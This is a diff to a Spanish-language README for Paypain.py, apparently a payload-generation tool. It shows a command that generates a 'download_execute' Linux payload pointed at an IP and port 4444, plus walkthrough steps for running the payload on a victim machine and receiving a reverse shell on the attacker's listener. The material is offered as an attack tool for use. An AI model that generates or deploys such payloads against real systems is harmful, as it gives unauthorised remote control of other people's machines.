@@ -106,10 +106,10 @@ python Paypain.py -i 192.168.1.100 -p 4444 -t download_execute -s linux -o paylo
 Generamos un payload de reverse shell para Linux
 ![Imagen 1](images/img1.png)
 
-Nos ponemos en escucha con Netcat en el sistema víctima
+Ejecutamos el payload en la máquina víctima
 ![Imagen 2](images/img2.png)
 
-Recibimos la reverse shell en nuestro sistema
+Recibimos la reverse shell en nuestro sistema, donde previamente nos habíamos puesto en escucha
 ![Imagen 3](images/img3.png)
 
 ## Contribución
